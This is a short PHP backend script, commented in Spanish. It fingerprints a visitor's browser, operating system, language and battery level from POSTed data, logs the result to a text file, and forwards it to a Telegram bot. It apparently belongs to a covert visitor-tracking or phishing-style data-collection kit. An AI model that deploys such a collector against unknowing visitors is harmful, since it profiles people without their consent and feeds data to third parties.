<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/telegram.php';

// Recibir datos
$user_agent = $_POST['agent'] ?? '';
$navegador = $_POST['navegador'] ?? '';
$versionapp = $_POST['versionapp'] ?? '';
$dystro = $_POST['dystro'] ?? '';
$lenguaje = $_POST['idioma'] ?? '';
$bateri = $_POST['bateri'] ?? 'No disponible';

// Procesar navegador
if (stripos($user_agent, 'Brave') !== false) $navegador = 'Brave';
elseif (stripos($user_agent, 'Edg') !== false) $navegador = 'Edge';
elseif (stripos($user_agent, 'OPR') !== false || stripos($user_agent, 'Opera') !== false) $navegador = 'Opera';
elseif (stripos($user_agent, 'Firefox') !== false) $navegador = 'Firefox';
elseif (stripos($user_agent, 'Safari') !== false && stripos($user_agent, 'Chrome') === false) $navegador = 'Safari';
elseif (stripos($user_agent, 'Chrome') !== false) $navegador = 'Chrome';
else $navegador = 'Desconocido';

// Sistema operativo
$sistema = stripos($user_agent, 'Android') !== false ? 'Android' :
           (stripos($user_agent, 'iPhone') !== false ? 'iOS' :
           (stripos($user_agent, 'Windows') !== false ? 'Windows' :
           (stripos($user_agent, 'Linux') !== false ? 'Linux' : 'Desconocido')));

// Idioma
$idioma = $lenguaje ?: 'Desconocido';

// Mensaje
$msg = "🖥 <b>Información del Dispositivo</b>\n\n";
$msg .= "- Navegador: $navegador\n";
$msg .= "- Sistema: $sistema\n";
$msg .= "- Idioma: $idioma\n";
$msg .= "- Batería: $bateri\n";

// Guardar en resultados.txt
file_put_contents(__DIR__ . '/resultados.txt', $msg . "\n----------------------\n", FILE_APPEND | LOCK_EX);

// ENVIAR A TELEGRAM (OBLIGATORIO)
send_to_telegram($msg);

echo json_encode(['status' => 'ok']);
?>
